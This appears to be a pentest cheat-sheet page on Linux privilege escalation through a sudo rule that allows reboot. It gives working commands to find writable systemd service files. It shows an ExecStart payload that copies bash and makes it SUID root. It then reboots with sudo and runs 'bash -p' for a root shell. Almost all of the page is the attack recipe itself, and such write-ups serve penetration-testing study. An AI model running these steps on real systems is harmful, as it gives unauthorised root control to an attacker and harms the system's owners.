# Sudo Reboot Privilege Escalation

The `sudo reboot` command might be vulnerable to privilege escalation (PrivEsc).

### Investigation <a href="#investigation" id="investigation"></a>

```shellscript
sudo -l

(ALL) NOPASSWD: /usr/sbin/reboot
```

If we can execute **"reboot"** command as root, we can escalate to privileges.

### Exploitation <a href="#exploitation" id="exploitation"></a>

#### 1. Find Service Config Files Which Are Writable <a href="#id-1-find-service-config-files-which-are-writable" id="id-1-find-service-config-files-which-are-writable"></a>

We need to look for the system service config file which are writable.

```shellscript
find / -writable -name "*.service" 2>/dev/null

/etc/systemd/system/example.service
```

#### 2. Insert a Payload <a href="#id-2-insert-a-payload" id="id-2-insert-a-payload"></a>

If we find a writable file, we can inject a payload into **Service.ExecStart**.

```shellscript
# /etc/systemd/systm/example.service
[Unit]
Description=Zeno monitoring

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'cp /bin/bash /home/<username>/bash; chmod +xs /home/<username>/bash'

[Install]
WantedBy=multi-user.target
```

#### 3. Reboot and Get a Root Shell <a href="#id-3-reboot-and-get-a-root-shell" id="id-3-reboot-and-get-a-root-shell"></a>

Now reboot as root.

```
sudo /usr/sbin/reboot
```

After the system rebooted, the command in the ExecStart will be executed.\
Now we should get a root shell by executing the copied bash command.

```
/home/<username>/bash -p
```
